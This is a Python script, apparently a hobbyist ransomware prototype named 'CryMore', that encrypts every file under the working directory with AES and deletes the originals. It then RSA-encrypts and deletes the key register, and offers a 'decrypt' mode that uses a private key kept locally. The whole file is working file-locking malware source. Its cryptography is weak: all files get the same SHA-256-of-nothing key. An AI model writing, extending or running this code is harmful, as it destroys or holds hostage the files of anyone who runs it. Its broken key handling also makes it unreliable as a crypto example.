import os, random, struct, requests, string, csv

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256

import argparse

"""
 ________   ________       ___    ___  _____ ______    ________   ________   _______      
|\   ____\ |\   __  \     |\  \  /  /||\   _ \  _   \ |\   __  \ |\   __  \ |\  ___ \     
\ \  \___| \ \  \|\  \    \ \  \/  / /\ \  \\\__\ \  \\ \  \|\  \\ \  \|\  \\ \   __/|    
 \ \  \     \ \   _  _\    \ \    / /  \ \  \\|__| \  \\ \  \\\  \\ \   _  _\\ \  \_|/__  
  \ \  \____ \ \  \\  \|    \/  /  /    \ \  \    \ \  \\ \  \\\  \\ \  \\  \|\ \  \_|\ \ 
   \ \_______\\ \__\\ _\  __/  / /       \ \__\    \ \__\\ \_______\\ \__\\ _\ \ \_______\
    \|_______| \|__|\|__||\___/ /         \|__|     \|__| \|_______| \|__|\|__| \|_______|
                         \|___|/                                                          
By: HallisMcG                                                                                       
"""
parser = argparse.ArgumentParser()
parser.add_argument('m', help="The metod")
args = parser.parse_args()


def encrypt_file(in_filename, key):
	"""
	Encrypts files.
	
	in_filename - name of file
	key - key used for decryption

	"""
	out_filename = in_filename + '.cry'
	iv = os.urandom(16)
	chunksize = 1024 * 24
	encryptor = AES.new(key, AES.MODE_CBC, iv)
	filesize = os.path.getsize(in_filename)

	with open(in_filename, 'rb') as infile:
		
		with open(out_filename, 'wb') as outfile:
			outfile.write(struct.pack('<Q', filesize))
			outfile.write(iv)

			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += b' ' * (16 - len(chunk) % 16)

				outfile.write(encryptor.encrypt(chunk))

	os.remove(in_filename)


def decrypt_file(in_filename, key):
	"""
	Decrypts files.
	
	in_filename - name of file
	key - key used for decryption

	"""
	out_filename = in_filename
	in_filename += '.cry'

	with open(in_filename, 'rb') as infile:
		chunksize = 1024 * 24
		origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
		iv = infile.read(16)
		decryptor = AES.new(key, AES.MODE_CBC, iv)

		with open(out_filename, 'wb') as outfile:
			while True:
				chunk = infile.read(chunksize)
				if len(chunk) == 0:
					break
				outfile.write(decryptor.decrypt(chunk))

				outfile.truncate(origsize)

	os.remove(in_filename)



def find_file():
	for root, dirs, files in os.walk(os.getcwd()):
		for f in files:
			if not f.endswith('.cry') and not f.endswith('.py') and not f.endswith('register.csv')  and not f.endswith('.vault'): 
				yield os.path.join(root, f)


def generate_password():
	return SHA256.new().digest()


def prepare():
	print('Creating register...')
	with open('register.csv', 'wb') as file:
		for f in find_file():
			if f:
				file.write(b'"' + bytes(f, 'ISO-8859-1') + b'" , "' + generate_password() + b'" \r\n ')	
	print('[DONE!]')


def encrypt(): # Need som improvement
	i = 0
	for file in get_from_register('register.csv'):
		try:
			encrypt_file(file[0], file[1])
			i += 1
			if i % 100  == 0:
				print(int(i / 100))
		except ValueError:
			print('{} was not a valid hash...'.format(file[1]))	
		except FileNotFoundError:
			print('{} was not found...'.format(file[0]))
		except:
			print("What???")


def secure():
	key = RSA.generate(2048)

	with open('hidden.vault', 'wb') as file:
		file.write(key.exportKey('DER')) # save the private key

	public_key = key.publickey()

	with open('register.csv', 'rb') as in_file:
		i = 0
		while True:
			#r = (random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(10))
			data = in_file.read(256)		

			if len(data) == 0:
				break

			enc = public_key.encrypt(data, 32)[0]

			with open(str(i) + '.cry', 'wb') as out_file:
				out_file.write(enc)#key.decrypt(data))

			i += 1

	os.remove('./register.csv')


def decrypt():
	with open('hidden.vault', 'rb') as file:
		key = RSA.importKey(file.read())

	i = 0
	while True:
		try:
			with open(str(i) + '.cry', 'rb') as in_file:
				with open('new_register.csv', 'ab') as out_file:
					data = in_file.read()	
					out_file.write(key.decrypt(data))

			os.remove(str(i) + '.cry')

		except FileNotFoundError:
			break		

		i += 1	

	i = 0
	
	for file in get_from_register('new_register.csv'):
		try:
			decrypt_file(file[0], file[1])
			i += 1
			if i % 100 == 0:
				print(int(i / 100))
		except FileNotFoundError:
			try:
				print('{} was not found...'.format(file[0]))
			except:
				pass
		except ValueError:
			print('{} was not a valid hash...'.format(file[1]))	
		except:
			print("Wut???")

	os.remove('hidden.vault')				
	os.remove('new_register.csv')


def get_from_register(filename):
	
	with open(filename, 'rb') as file:
		data = b''

		while True:
			data += file.read(1024)

			if len(data) == 0:
				break

			lines = data.split(b' \r\n ')
			data = b''
			
			for line in lines:

				i = line.split(b'" , "')

				if len(i) == 2:
					if i[1].endswith(b'\r\n'):
						i[1] = i[1][:-4]
					if i[1].endswith(b'"'):
						i[1] = i[1][:-1]
					i[0] = str(i[0], 'ISO-8859-1').lstrip('"')

					yield i[0], i[1]

				else:
					data = line


def main():
	os.system('cls')
		
	if args.m == 'decrypt':
		decrypt()

	else:
		print('Encrypting')
		prepare()
		encrypt()
		secure()

if __name__ == '__main__':
	main()



